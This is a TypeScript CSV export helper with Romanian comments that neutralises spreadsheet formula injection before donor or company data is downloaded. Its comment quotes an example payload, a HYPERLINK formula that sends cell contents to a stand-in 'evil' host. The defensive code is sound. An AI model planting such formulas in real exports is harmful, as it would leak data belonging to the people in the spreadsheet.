"use client";

// Injecție de formule (CSV injection): un nume de donator sau de firmă ca
// `=HYPERLINK("https://evil/?"&A2,"x")` se execută când echipa deschide
// exportul în Excel/Sheets. Un text care începe cu = @ tab sau CR (sau cu + / -
// dar care NU e doar un număr/telefon) primește prefix `'`, ca să rămână text.
// Numerele adevărate (tipul number) și telefoanele ("+40 712...") rămân neatinse.
function neutralizeazaFormula(s: string): string {
  if (/^[=@\t\r]/.test(s)) return `'${s}`;
  if (/^[+-]/.test(s) && !/^[+-]?[\d\s().-]+$/.test(s)) return `'${s}`;
  return s;
}

function csvCell(v: unknown): string {
  const brut = v === null || v === undefined ? "" : String(v);
  const s = typeof v === "string" ? neutralizeazaFormula(brut) : brut;
  return /[",\n;]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv<T extends Record<string, unknown>>(rows: T[], columns: { key: keyof T; header: string }[]): string {
  const header = columns.map((c) => csvCell(c.header)).join(",");
  const body = rows.map((r) => columns.map((c) => csvCell(r[c.key])).join(",")).join("\n");
  return `${header}\n${body}`;
}

export function downloadCsv(filename: string, csv: string) {
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
